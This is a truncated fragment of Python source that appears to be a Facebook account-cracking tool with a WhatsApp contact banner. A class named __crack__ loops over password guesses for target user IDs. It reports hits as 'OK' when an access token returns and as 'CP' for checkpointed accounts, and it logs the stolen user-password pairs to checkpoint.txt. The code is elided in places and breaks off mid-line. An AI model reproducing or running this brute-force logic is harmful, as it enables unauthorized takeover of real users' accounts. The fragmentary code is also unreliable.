...
\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m+923470336477
...
class __crack__:
    ...
    def __api__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if "access_token" in p:
                Ella_Boy('\r\033[0;92mOK %s • %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    Ella_Boy('\r\033[0;93mCP %s • %s %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                Ella_Boy('\r\033[0;93mCP %s • %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('checkpoint.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[0m[ %s/%s ] \033[0;92mOk [%s] \033[0;93mCP [%s]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
